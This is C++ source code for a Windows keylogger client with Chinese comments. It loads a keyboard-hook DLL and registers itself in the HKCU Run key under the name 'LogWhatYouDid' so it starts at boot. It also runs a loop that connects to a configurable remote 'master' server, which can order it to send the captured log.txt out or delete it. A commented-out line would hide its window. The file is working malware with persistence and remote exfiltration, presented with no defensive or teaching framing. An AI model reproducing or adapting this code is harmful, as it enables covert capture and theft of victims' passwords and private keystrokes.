#include <windows.h>
#include <iostream>
#include <Winsock.h>
#include <iostream>
#include <string>
#include <cstdio>
#include <conio.h>
using namespace std;
#pragma comment(lib, "wsock32.lib")

//公网服务器地址设置**************************
char masterIP[20] = "127.0.0.1";
#define masterPORT 12345 
//*********************************************

typedef VOID(*pfnUnhookKbdHook)();
typedef BOOL(*pfnSetKbdHook)();

SOCKET sockMonitor;
sockaddr_in masterAddr;				//master地址 
int addrLen;		//地址长度
char order[20];		//命令
char rbuff[1024];	//接收缓冲区
char sbuff[1024];	//发送缓冲区

//***************函数声明***************
DWORD InitSock();
int sendFile(SOCKET datatcps, FILE* file);
DWORD connectProcess();
//***************函数声明***************

//初始化winsock
DWORD InitSock() {
	WSADATA WSAData;
	if (WSAStartup(MAKEWORD(2, 2), &WSAData) != 0) {
		cout << "初始化失败" << endl;
		return -1;
	}

	//配置master地址
	masterAddr.sin_family = AF_INET;					//表明底层是使用的哪种通信协议来递交数据的，AF_INET表示使用 TCP/IPv4 地址族进行通信
	masterAddr.sin_addr.s_addr = inet_addr(masterIP);	//指定服务器IP，十进制转化成二进制IPV4地址
	masterAddr.sin_port = htons(masterPORT);			//设置端口号，htons用于将主机字节序改为网络字节序

	return 1;
}

DWORD connectProcess() {
	memset(rbuff, 0, sizeof(rbuff));
	memset(sbuff, 0, sizeof(sbuff));

	cout << "连接远程服务器…" << endl;
	while (TRUE)
	{
		sockMonitor = socket(AF_INET, SOCK_STREAM, 0);
		if (sockMonitor == SOCKET_ERROR) {
			cout << "创建失败" << endl;
			WSACleanup();
			return -1;
		}
		if (connect(sockMonitor, (struct sockaddr*)&masterAddr, sizeof(masterAddr)) == SOCKET_ERROR) {
			cout << "连接失败，准备重试..." << endl;
			continue;
		}
		cout << "连接成功，等待接收命令..." << endl;
		int cnt = recv(sockMonitor, rbuff, sizeof(rbuff), 0);
		cout << rbuff << endl;
		if (cnt > 0)
		{
			cout << endl << "获取并执行的命令：" << rbuff << endl;

			//获取日志命令 get
			if (strncmp(rbuff, "get", 3) == 0) {
				FILE* file;
				//读取log
				fopen_s(&file, "log.txt", "rb");//二进制打开文件，只允许读
				if (file) {
					if (!sendFile(sockMonitor, file)) {
						cout << "发送失败" << endl;
						fclose(file);
						continue;
					}
					else {
						fclose(file);
						continue;
					}
				}
				else {
					strcpy_s(sbuff, "error");
					if (send(sockMonitor, sbuff, sizeof(sbuff), 0)) {
						continue;
					}
				}
			}
			//清除记录命令 clean
			else if (strncmp(rbuff, "clean", 5) == 0) {
				if (DeleteFile(L"log.txt") == 0) {
					strcpy_s(sbuff, "删除成功\n");
					if (send(sockMonitor, sbuff, sizeof(sbuff), 0)) {
						continue;
					}
				}
				else {
					strcpy_s(sbuff, "删除失败\n");
					if (send(sockMonitor, sbuff, sizeof(sbuff), 0)) {
						continue;
					}
				}
			}
			else
			{
				cout << "未知命令" << endl;
			}
		}
		closesocket(sockMonitor);  //关闭套接字
		memset(rbuff, 0, sizeof(rbuff));
		memset(sbuff, 0, sizeof(sbuff));

	}
	return 0;
}

int sendFile(SOCKET datatcps, FILE* file) {
	cout << "正在发送文件…" << endl;
	memset(sbuff, '\0', sizeof(sbuff));
	//从文件中循环读取数据并发送至客户端
	while (TRUE) {
		int len = fread(sbuff, 1, sizeof(sbuff), file);//把file指针指向的文件中的内容读取到sbuff中
		if (send(datatcps, sbuff, len, 0) == SOCKET_ERROR) {
			cout << "连接失败" << endl;
			closesocket(datatcps);
			return 0;
		}
		if (feof(file)) {
			break;
		}
	}
	closesocket(datatcps);
	cout << "发送成功" << endl;
	return 1;
}

//监听线程函数
DWORD connectToMaster(LPVOID lpParam)
{
	InitSock();
	while (TRUE) {
		connectProcess();
		Sleep(300);
	}
}

// 开机自启动注册函数
void HKRunator()   
{
	char* programName;
	_get_pgmptr(&programName);
	cout << programName << endl;

	HKEY hkey = NULL;
	DWORD rc;

	rc = RegCreateKeyExA(HKEY_CURRENT_USER,                      //创建一个注册表项，如果有则打开该注册表项
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WOW64_64KEY | KEY_ALL_ACCESS,                  
		NULL,
		&hkey,
		NULL);

	if (rc == ERROR_SUCCESS)
	{
		rc = RegSetValueExA(hkey,
			"LogWhatYouDid",
			0,
			REG_SZ,
			(const BYTE*)programName,
			strlen(programName));
		if (rc == ERROR_SUCCESS)
		{
			cout << "Success Registed" << endl;
			RegCloseKey(hkey);
		}
	}
	else
	{
		cout << "Failed" << endl;
	}
}

//HOOK线程
DWORD hookStill(LPVOID lpParam)
{
	HMODULE hMod = NULL;
	MSG msg;
	pfnUnhookKbdHook pfnUnhook = NULL;
	pfnSetKbdHook pfnHook = NULL;

	hMod = LoadLibraryA("hook.dll");
	if (hMod == NULL)
	{
		return(-1);
	}
	pfnHook = (pfnSetKbdHook)GetProcAddress(hMod, "SetKbdHook");
	if (pfnHook == NULL)
	{
		return(-1);
	}
	pfnHook();

	// 消息循环
	while (GetMessage(&msg, NULL, 0, 0) != 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	pfnUnhook = (pfnUnhookKbdHook)GetProcAddress(hMod, "UnhookKbdHook");
	if (NULL == pfnUnhook)
	{
		return(-1);
	}
	pfnUnhook();
}

int main()
{
	//HWND hwnd = GetActiveWindow();
	//ShowWindow(hwnd, SW_HIDE);

	//设置开机自启动
	HKRunator();

	//开启监听线程
	HANDLE connectThread;
	DWORD connectThreadID = 0;
	connectThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)connectToMaster, 0, 0, &connectThreadID);

	//HOOK线程
	HANDLE hookThread;
	DWORD hookThreadID = 1;
	hookThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hookStill, 0, 0, &hookThreadID);

	system("pause");

	return(0);
}